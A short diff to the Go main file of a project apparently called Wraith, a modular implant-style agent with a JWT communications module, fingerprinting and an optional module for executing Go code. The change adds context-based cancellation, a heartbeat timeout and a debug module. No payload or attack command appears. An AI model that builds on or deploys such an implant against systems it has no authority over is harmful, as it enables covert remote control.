@@ -1,6 +1,7 @@
 package main
 
 import (
+	"context"
 	"os"
 	"os/signal"
 	"syscall"
@@ -47,15 +48,21 @@ func main() {
 	// Create Wraith
 	w := libwraith.Wraith{}
 
+	// Create context for Wraith
+	ctx, ctxCancel := context.WithCancel(context.Background())
+
 	// Start Wraith in goroutine
 	go w.Spawn(
+		ctx,
 		libwraith.Config{
 			FamilyId:                   "none",
 			FingerprintGenerator:       func() string { return "none" },
+			HeartbeatTimeout:           1 * time.Second,
 			ModuleCrashloopDetectCount: 3,
 			ModuleCrashloopDetectTime:  30 * time.Second,
 		},
 		&stdmod.JWTCommsManagerModule{},
+		&stdmod.DebugModule{},
 	//	&stdmod.ExecGoModule{},
 	//	&stdmod.WCommsPinecone{},
 	)
@@ -64,6 +71,6 @@ func main() {
 	<-exitTrigger
 
 	// Kill Wraith and exit
-	w.Kill()
+	ctxCancel()
 	time.Sleep(1 * time.Second) // wait to make sure everything has cleaned itself up
 }
